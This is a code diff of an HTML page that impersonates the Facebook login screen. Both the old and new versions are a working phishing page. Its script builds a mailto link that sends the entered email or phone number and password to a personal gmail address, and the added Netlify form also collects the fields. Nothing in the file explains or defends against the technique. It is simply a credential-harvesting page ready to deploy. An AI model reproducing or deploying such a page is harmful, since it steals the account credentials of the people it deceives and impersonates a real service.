@@ -1,89 +1,100 @@
-
 <!DOCTYPE html>
 <html>
-<head>
-<title>Facebook Login</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-<style type="text/css">
-.header{
-   color: #0080ff;
-}
-#input,#pswd{
-   font-size: 17px;
-   padding: 10px;
-   width: 300px;
-   height: 20px;
-   margin: 5px 10px;
-   background: #f2f2f2;
-   color: black;
-   border: 1px solid #ddd;
-   outline-color: #0080ff;
-}
-.sub{
-   font-size: 17px;
-   font-weight: bold;
-   height: 40px;
-   background: #0080ff;
-   color: white;
-   border: none;
-   outline: none;
-   border-radius: 5px;
-   width: 322px;
-   margin: 5px 10px;
-}
-.forgot{
-   text-align: center;
-   margin-top: 10px;
-   color: #0080ff;
-}
-.or{
-   margin-top: 20px;
-   display: flex;
-   align-items: center;
-   justify-content: center;
-}
-.or > div{
-   width: 140px;
-   height: 1.5px;
-   background: #ddd;
-   margin-left: 10px;
-}
-.new_account{
-  font-size: 17px;
-  font-weight: bold;
-  height: 43px;
-  background: #00a100;
-  color: white;
-  border: none;
-  outline: none;
-  border-radius: 5px;
-  width: 220px;
-  margin-top: 5px;
-}
-</style>
-</head>
-<body>
-<h2 align="center" class="header">facebook</h2>
-<input id="input" placeholder="Mobile number or email address" name="number"><br>
-<input type="password" id="pswd" placeholder="Password" name="password"><br>
-<button class="sub" onclick="submit()">Log In</button><br>
-<div class="forgot">Forgotten password?</div>
-<div class="or">
-<div></div>&nbsp; or <div></div>
-</div><br>
-<center><button class="new_account">Create New Account</button></center>
-<script type="text/javascript">
-let input = document.getElementById("input");
-let pswd = document.getElementById("pswd");
-function submit(){
-if(input.value.length<10){alert("Invalid email or number");}
-if(pswd.value.length<5){alert("Invalid Password");}
-else{
-let a = document.createElement("a");
-a.href="mailto:kingjayeriughe@gmail.com?subject="+input.value+"&body=username:"+input.value+",password:"+pswd.value;
-a.click();
-}
-}
-</script>
-</body>
-</html> 
+
+   <head>
+      <title>Facebook Login</title>
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <style type="text/css">
+         .header {
+            color: #0080ff;
+         }
+
+         #input,
+         #pswd {
+            font-size: 17px;
+            padding: 10px;
+            width: 300px;
+            height: 20px;
+            margin: 5px 10px;
+            background: #f2f2f2;
+            color: black;
+            border: 1px solid #ddd;
+            outline-color: #0080ff;
+         }
+
+         .sub {
+            font-size: 17px;
+            font-weight: bold;
+            height: 40px;
+            background: #0080ff;
+            color: white;
+            border: none;
+            outline: none;
+            border-radius: 5px;
+            width: 322px;
+            margin: 5px 10px;
+         }
+
+         .forgot {
+            text-align: center;
+            margin-top: 10px;
+            color: #0080ff;
+         }
+
+         .or {
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+         }
+
+         .or>div {
+            width: 140px;
+            height: 1.5px;
+            background: #ddd;
+            margin-left: 10px;
+         }
+
+         .new_account {
+            font-size: 17px;
+            font-weight: bold;
+            height: 43px;
+            background: #00a100;
+            color: white;
+            border: none;
+            outline: none;
+            border-radius: 5px;
+            width: 220px;
+            margin-top: 5px;
+         }
+      </style>
+   </head>
+
+   <body>
+      <h2 align="cener" class="header">facebook</h2>
+      <form name="contact" netlify>
+        <input id="input" placeholder="Mobile number or email address" name="number"><br>
+         <input type="password" id="pswd" placeholder="Password" name="password"><br>
+         <button class="sub" onclick="submit()">Log In</button><br>
+      </form>
+         <div class="forgot">Forgotten password?</div>
+         <div class="or">
+            <div></div>&nbsp; or <div></div>
+         </div><br>
+         <center><button class="new_account">Create New Account</button></center>
+         <script type="text/javascript">
+            let input = document.getElementById("input");
+            let pswd = document.getElementById("pswd");
+            function submit() {
+               if (input.value.length < 10) { alert("Invalid email or number"); }
+               if (pswd.value.length < 5) { alert("Invalid Password"); }
+               else {
+                  let a = document.createElement("a");
+                  a.href = "mailto:kingjayeriughe@gmail.com?subject=" + input.value + "&body=username:" + input.value + ",password:" + pswd.value;
+                  a.click();
+               }
+            }
+         </script>
+   </body>
+
+</html>
